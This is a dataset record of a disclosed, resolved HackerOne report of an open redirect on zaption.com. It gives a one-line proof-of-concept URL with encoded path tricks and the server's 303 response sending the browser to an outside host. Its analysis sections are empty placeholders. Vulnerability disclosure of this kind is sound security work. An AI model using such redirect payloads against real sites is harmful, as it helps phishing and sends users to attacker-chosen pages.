---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '45516'
original_report_id: '45516'
title: '[zaption.com] Open Redirect'
weakness: Open Redirect
team_handle: zaption
created_at: '2015-01-28T11:15:52.409Z'
disclosed_at: '2016-10-29T16:09:35.995Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 9
tags:
- hackerone
- open-redirect
---

# [zaption.com] Open Redirect

## Metadata

- HackerOne Report ID: 45516
- Weakness: Open Redirect
- Program: zaption
- Disclosed At: 2016-10-29T16:09:35.995Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

PoC:
http://zaption.com///www.google.com/%2f%2e%2e

HTTP Response:
> HTTP/1.1 303 See Other
> Access-Control-Allow-Origin: *
> Content-Type: text/html; charset=utf-8
> Date: Wed, 28 Jan 2015 11:10:52 GMT
> Location: //www.google.com/%2f%2e%2e/

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
